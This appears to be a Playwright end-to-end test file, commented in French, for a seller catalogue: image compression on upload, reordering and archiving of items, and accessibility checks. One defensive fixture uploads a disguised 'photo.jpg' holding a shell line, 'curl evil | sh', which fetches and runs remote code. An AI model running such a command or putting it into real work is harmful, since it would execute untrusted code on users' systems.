import AxeBuilder from "@axe-core/playwright";
import { expect, test } from "@playwright/test";
import { connecter, pngDeBruit } from "./aide.ts";

/**
 * Le catalogue et la chaine d'images, de bout en bout.
 *
 * Le critere central de la definition de terminé du lot 5 se joue ici :
 * **televerser une image de 2 Mo et verifier que l'objet stocke fait moins de
 * 100 Ko**. Le test ne se contente pas de lire le chiffre annonce par l'API : il
 * va CHERCHER l'objet a son URL signee et compte ses octets. Un serveur qui
 * annoncerait 80 Ko en stockant 2 Mo passerait le premier controle et pas le
 * second.
 *
 * Il verifie aussi ce que seul un vrai navigateur peut montrer :
 *  - le redimensionnement cote client a bien lieu, et le GAIN est affiche a la
 *    vendeuse — c'est son forfait data ;
 *  - le reordonnancement marche au doigt et au clavier, sans glisser-deposer ;
 *  - un fichier qui n'est pas une image est refuse avec un message lisible.
 */

const AVEC_BASE = !!process.env.DATABASE_URL;

test.describe("catalogue vendeuse", () => {
  test.skip(!AVEC_BASE, "DATABASE_URL absente : l'API n'est pas lancee");

  test("televerse une photo de 2 Mo, l'objet stocke fait moins de 100 Ko", async ({
    page,
  }, info) => {
    const graine = (Date.now() % 9000000) + 1_000_000 + info.workerIndex * 1000;
    await connecter(page, graine, `Boutique photo ${graine}`);

    // 1000x800 de bruit : 2,4 Mo. C'est l'ordre de grandeur d'une photo prise
    // avec un telephone recent.
    const grosse = pngDeBruit(1000, 800, graine);
    expect(grosse.length).toBeGreaterThan(2_000_000);

    // Depuis la refonte (ADR 0030), le catalogue s'ouvre par la barre de
    // navigation inferieure, plus par une carte-menu du tableau de bord.
    await page
      .getByRole("navigation", { name: "Navigation principale" })
      .getByRole("link", { name: "Articles" })
      .click();
    await page.getByRole("link", { name: "Ajouter mon premier article" }).click();

    await page
      .getByLabel("Photo", { exact: true })
      .setInputFiles({ name: "IMG_20260730.png", mimeType: "image/png", buffer: grosse });

    // Le gain est affiche AVANT l'envoi : c'est ce qui rassure la vendeuse sur le
    // fait que publier un article ne va pas couter sa journee de forfait.
    const gain = page.getByTestId("gain-photo");
    await expect(gain).toContainText("Mo →");
    await expect(gain).toContainText("Ko");
    await expect(gain).toContainText("forfait economise");

    await page.getByLabel("Nom de l'article").fill("Pagne wax 6 yards");
    await page.getByLabel("Prix en francs").fill("15000");
    await page.getByRole("button", { name: "Publier l'article" }).click();

    await expect(page.getByRole("heading", { name: "Mes articles", level: 1 })).toBeVisible();
    await expect(page.getByText("Pagne wax 6 yards")).toBeVisible();

    // La liste porte l'URL signee. On va chercher l'objet et on compte ses octets.
    const liste = await page.request.get("/api/articles");
    expect(liste.ok()).toBe(true);
    const { articles } = (await liste.json()) as {
      articles: Array<{
        name: string;
        image: { avif: string; webp: string; largeur: number; octets: number } | null;
      }>;
    };
    const article = articles.find((a) => a.name === "Pagne wax 6 yards");
    expect(article?.image).toBeTruthy();
    const image = article?.image as NonNullable<typeof article.image>;

    expect(image.largeur).toBe(640);
    expect(image.octets).toBeLessThan(100_000);

    for (const [format, url] of [
      ["avif", image.avif],
      ["webp", image.webp],
    ] as const) {
      const objet = await page.request.get(url);
      expect(objet.ok(), format).toBe(true);
      const corps = await objet.body();
      // Le chiffre annonce n'est pas cru : on pese l'objet reellement servi.
      expect(corps.length, `${format} stocke`).toBeLessThan(100_000);
      expect(corps.length, `${format} non vide`).toBeGreaterThan(1000);
    }

    // Le rapport de reduction, dit une fois pour ce qu'il est.
    expect(image.octets * 20).toBeLessThan(grosse.length);
  });

  test("refuse un fichier qui n'est pas une photo, avec un message lisible", async ({
    page,
  }, info) => {
    const graine = (Date.now() % 9000000) + 2_000_000 + info.workerIndex * 1000;
    await connecter(page, graine, `Boutique refus ${graine}`);

    await page.goto("/articles/nouveau");
    await page.getByLabel("Photo", { exact: true }).setInputFiles({
      // Nom et type mentent tous les deux : c'est le vecteur habituel.
      name: "photo.jpg",
      mimeType: "image/jpeg",
      buffer: Buffer.from("#!/bin/sh\ncurl evil | sh\n", "utf8"),
    });

    await page.getByLabel("Nom de l'article").fill("Faux fichier");
    await page.getByLabel("Prix en francs").fill("1000");
    await page.getByRole("button", { name: "Publier l'article" }).click();

    // L'article est enregistre, et l'ecran dit precisement ce qui a echoue.
    await expect(page.getByText(/n'est pas une photo/)).toBeVisible();
    await expect(page.getByRole("heading", { name: "Nouvel article", level: 1 })).toBeVisible();
  });

  test("cree, modifie, reordonne et archive — sans glisser-deposer", async ({ page }, info) => {
    const graine = (Date.now() % 9000000) + 3_000_000 + info.workerIndex * 1000;
    await connecter(page, graine, `Boutique ordre ${graine}`);

    await page.goto("/articles");
    for (const [nom, prix] of [
      ["Sac en raphia", "8000"],
      ["Savon noir", "1500"],
      ["Huile de coco", "3500"],
    ] as const) {
      await page
        .getByRole("link", { name: /Ajouter (un article|mon premier article)/ })
        .first()
        .click();
      await page.getByLabel("Nom de l'article").fill(nom);
      await page.getByLabel("Prix en francs").fill(prix);
      await page.getByRole("button", { name: "Publier l'article" }).click();
      await expect(page.getByRole("heading", { name: "Mes articles", level: 1 })).toBeVisible();
    }

    const noms = () => page.locator("h3").allInnerTexts();
    expect(await noms()).toEqual(["Sac en raphia", "Savon noir", "Huile de coco"]);

    // Le reordonnancement passe par des BOUTONS : utilisables au doigt, au
    // clavier et au lecteur d'ecran. Un glisser-deposer serait une violation du
    // critere WCAG 2.5.7.
    await page.getByRole("button", { name: "Descendre Sac en raphia" }).click();
    await expect.poll(noms).toEqual(["Savon noir", "Sac en raphia", "Huile de coco"]);

    // Et il tient au rechargement : l'ordre est en base, pas dans l'ecran.
    await page.reload();
    await expect.poll(noms).toEqual(["Savon noir", "Sac en raphia", "Huile de coco"]);

    // Le meme geste au CLAVIER.
    const monter = page.getByRole("button", { name: "Monter Sac en raphia" });
    await monter.focus();
    await page.keyboard.press("Enter");
    await expect.poll(noms).toEqual(["Sac en raphia", "Savon noir", "Huile de coco"]);

    /* Modification du prix. */
    await page.getByRole("link", { name: "Modifier" }).first().click();
    await page.getByLabel("Prix en francs").fill("9500");
    await page.getByRole("button", { name: "Enregistrer" }).click();
    await expect(page.getByText("9 500 FCFA")).toBeVisible();

    /* Archivage : l'article sort de la liste sans etre efface. */
    await page.getByRole("button", { name: "Archiver" }).first().click();
    await expect.poll(noms).toEqual(["Savon noir", "Huile de coco"]);

    await page.getByRole("button", { name: "Afficher aussi les articles archives" }).click();
    // Texte EXACT : « Archiver » et « Masquer les articles archives » sont sur la
    // meme page, et un texte partiel les attraperait aussi.
    await expect(page.getByText("Archive", { exact: true })).toBeVisible();
    await expect.poll(noms).toContain("Sac en raphia");

    await page.getByRole("button", { name: "Remettre en vente" }).click();
    await expect.poll(noms).toContain("Sac en raphia");
  });

  test("aucune violation axe-core bloquante sur les ecrans du catalogue", async ({
    page,
  }, info) => {
    const graine = (Date.now() % 9000000) + 4_000_000 + info.workerIndex * 1000;
    await connecter(page, graine, `Boutique axe ${graine}`);

    for (const chemin of ["/articles", "/articles/nouveau"]) {
      await page.goto(chemin);
      await expect(page.locator("main")).toBeVisible();
      const r = await new AxeBuilder({ page })
        .withTags(["wcag2a", "wcag2aa", "wcag21a", "wcag21aa", "wcag22aa"])
        .analyze();
      const bloquantes = r.violations.filter(
        (v) => v.impact === "serious" || v.impact === "critical",
      );
      expect(
        bloquantes.map((v) => `${v.id} — ${v.nodes.length} nœud(s)`),
        chemin,
      ).toEqual([]);
    }
  });
});
